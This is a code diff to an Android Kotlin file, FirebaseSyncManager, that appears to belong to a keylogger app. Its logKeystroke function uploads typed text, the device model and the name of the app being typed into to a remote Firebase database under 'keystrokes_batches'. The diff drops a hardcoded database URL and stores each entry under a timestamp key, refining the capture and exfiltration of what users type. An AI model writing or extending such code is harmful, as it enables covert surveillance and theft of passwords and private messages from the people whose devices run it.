@@ -6,11 +6,13 @@ import com.google.firebase.database.FirebaseDatabase
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
+import java.text.SimpleDateFormat
+import java.util.Date
+import java.util.Locale
 
 class FirebaseSyncManager {
     companion object {
         private const val TAG = "FirebaseSyncManager"
-        private const val DB_URL = "https://key-lo-5811c-default-rtdb.firebaseio.com"
         private val scope = CoroutineScope(Dispatchers.IO)
 
         fun logKeystroke(text: String, packageName: String?) {
@@ -18,10 +20,11 @@ class FirebaseSyncManager {
 
             scope.launch {
                 try {
-                    val database = FirebaseDatabase.getInstance(DB_URL)
+                    val database = FirebaseDatabase.getInstance()
                     val deviceName = Build.MODEL?.replace(Regex("[^a-zA-Z0-9_-]"), "_")?.ifBlank { "Unknown_Device" } ?: "Unknown_Device"
                     val ref = database.getReference().child("keystrokes_batches").child(deviceName)
                     val appName = (packageName ?: "unknown.app").replace(Regex("[^a-zA-Z0-9_-]"), "_")
+                    val timestampKey = SimpleDateFormat("yyyy-MM-dd_HH-mm-ss_SSS", Locale.getDefault()).format(Date())
 
                     val logData = mapOf(
                         "deviceName" to deviceName,
@@ -30,7 +33,7 @@ class FirebaseSyncManager {
                         "typedContent" to text
                     )
 
-                    ref.child(appName).push().setValue(logData)
+                    ref.child(appName).child(timestampKey).setValue(logData)
                         .addOnSuccessListener {
                             Log.d(TAG, "Keystroke synced successfully: $text")
                             LogStore.addLog("[$deviceName] Keystroke synced ($appName): $text")
